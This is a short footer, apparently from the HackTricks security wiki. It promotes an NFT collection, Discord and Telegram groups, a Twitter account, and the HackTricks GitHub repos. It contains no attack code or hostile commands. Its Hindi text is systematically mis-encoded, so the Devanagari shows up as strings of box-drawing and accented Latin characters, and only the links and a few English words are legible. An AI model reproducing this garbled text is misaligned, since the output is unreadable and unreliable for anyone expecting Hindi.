* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
